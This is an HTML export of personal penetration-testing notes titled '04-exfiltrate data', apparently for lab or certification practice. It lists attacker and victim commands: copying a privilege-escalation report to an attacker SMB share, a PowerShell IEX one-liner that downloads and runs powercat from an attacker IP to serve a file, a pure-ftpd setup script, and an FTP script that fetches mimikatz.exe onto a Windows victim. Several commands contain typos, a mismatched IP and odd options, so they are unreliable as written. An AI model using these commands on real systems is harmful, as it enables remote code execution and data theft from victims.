<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>04-exfiltrate data</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>04-exfiltrate data</h1><br/><p><h2>SMB </h2><ul><li>smbserver <ul><li>sometimes you need to specify the username and passwoitd dependeing on teh configuration <ul><li>(need to see command successfull)</li></ul></li></ul></li><li>ATTACKER kali<ul><li>   </li></ul></li><li>VICTIM windows<ul><li></li></ul></li></ul><div class="codebox"><pre>net use <span style="color:#ff9d00;font-weight:700">\\</span><span style="color:#333333;font-weight:400">192.168</span>.<span style="color:#333333;font-weight:400">49.131</span><span style="color:#ff9d00;font-weight:700">\</span>share <span style="color:#ff9d00;font-weight:700">/</span>user<span style="color:#ff9d00;font-weight:700">:</span>df df<br /><span style="color:#ff9d00;font-weight:700">copy</span> PrivescCheck_report.txt <span style="color:#ff9d00;font-weight:700">\\</span><span style="color:#333333;font-weight:400">192.168</span>.<span style="color:#333333;font-weight:400">49.131</span><span style="color:#ff9d00;font-weight:700">\</span>share</pre></div></p><p><h2>powercat</h2></p><p><div class="codebox"><pre><span style="color:#0088ff;font-weight:400">## victim</span><br /> powershell.exe -c <span style="color:#3ad900;font-weight:400">&quot;IEX(New-Object System.Net.WebClient).DownloadString(&#39;http://10.10.10.1/powercat.ps1&#39;);powercat -l -p 4444 -i C:\Users\test\FiletoDownload&quot;</span><br /><br /><span style="color:#0088ff;font-weight:400">##attacker</span><br /><span style="color:#ff9d00;font-weight:700">wget</span> http://10.10.10.2:4444/FiletoDownload</pre></div></p><p></p><p></p><p></p><p><h2>FTP</h2></p><p><ul><li>Target<ul><li></li></ul></li></ul><div class="codebox"><pre><span style="color:#0088ff;font-weight:400">#Run the following script to configure the FTP server</span><br /><span style="color:#0088ff;font-weight:400">#!/bin/bash</span><br />groupadd ftpgroup<br />useradd -g ftpgroup -d /dev/null -s /etc ftpuser<br />pure-pwd useradd fusr -u ftpuser -d /ftphome<br />pure-pw mkdb<br /><span style="color:#ff9d00;font-weight:700">cd</span> /etc/pure-ftpd/auth/<br /><span style="color:#ff9d00;font-weight:700">ln</span> -s ../conf/PureDB 60pdb<br /><span style="color:#ff9d00;font-weight:700">mkdir</span> -p /ftphome<br /><span style="color:#ff9d00;font-weight:700">chown</span> -R ftpuser:ftpgroup /ftphome/<br /><span style="color:#ff9d00;font-weight:700">/</span>etc<span style="color:#ff9d00;font-weight:700">/</span>init.d<span style="color:#ff9d00;font-weight:700">/</span>pure-ftpd restart</pre></div><ul><li>WINDOWS victim<ul><li></li></ul></li></ul><div class="codebox"><pre><span style="color:#0088ff;font-weight:400">#Work well with python. With pure-ftp use fusr:ftp</span><br /><span style="color:#ff9d00;font-weight:700">echo</span> open <span style="color:#333333;font-weight:400">10.11</span>.<span style="color:#333333;font-weight:400">0.41</span> <span style="color:#333333;font-weight:400">21</span> &gt; ftp.txt<br /><span style="color:#ff9d00;font-weight:700">echo</span> USER anonymous &gt;&gt; ftp.txt<br /><span style="color:#ff9d00;font-weight:700">echo</span> anonymous &gt;&gt; ftp.txt<br /><span style="color:#ff9d00;font-weight:700">echo</span> bin &gt;&gt; ftp.txt<br /><span style="color:#ff9d00;font-weight:700">echo</span> GET mimikatz.exe &gt;&gt; ftp.txt<br /><span style="color:#ff9d00;font-weight:700">echo</span> bye &gt;&gt; ftp.txt<br />ftp <span style="color:#ff9d00;font-weight:700">-</span>n <span style="color:#ff9d00;font-weight:700">-</span>v <span style="color:#ff9d00;font-weight:700">-</span>s<span style="color:#ff9d00;font-weight:700">:</span>ftp.txt</pre></div></p></div>
</body>
</html>
